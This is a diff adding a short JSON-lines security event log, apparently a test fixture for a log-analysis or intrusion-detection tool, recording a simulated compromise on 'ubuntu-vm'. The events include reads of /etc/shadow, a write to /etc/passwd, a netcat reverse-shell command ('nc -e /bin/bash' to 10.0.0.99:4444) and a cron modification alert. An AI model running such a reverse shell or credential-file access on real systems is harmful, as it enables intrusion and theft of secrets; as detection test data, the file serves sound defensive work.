@@ -1,0 +1,5 @@
+{"timestamp": "2026-03-25T03:06:00", "event": "file_access", "user": "alice", "path": "/etc/shadow", "ip": "192.168.1.50", "hostname": "ubuntu-vm", "details": "read attempt via cat"}
+{"timestamp": "2026-03-25T03:06:30", "event": "file_modified", "user": "alice", "path": "/etc/passwd", "ip": "192.168.1.50", "hostname": "ubuntu-vm", "details": "write access detected"}
+{"timestamp": "2026-03-25T03:07:00", "event": "sensitive_command", "user": "alice", "path": "", "ip": "192.168.1.50", "hostname": "ubuntu-vm", "details": "nc -e /bin/bash 10.0.0.99 4444"}
+{"timestamp": "2026-03-25T03:08:00", "event": "network_anomaly", "user": "alice", "path": "", "ip": "192.168.1.50", "hostname": "ubuntu-vm", "details": "outbound connection to 10.0.0.99:4444"}
+2026-03-25T03:09:00 SENTINEL event=custom_alert user=root ip=10.0.0.5 hostname=ubuntu-vm details=unauthorized_cron_modification
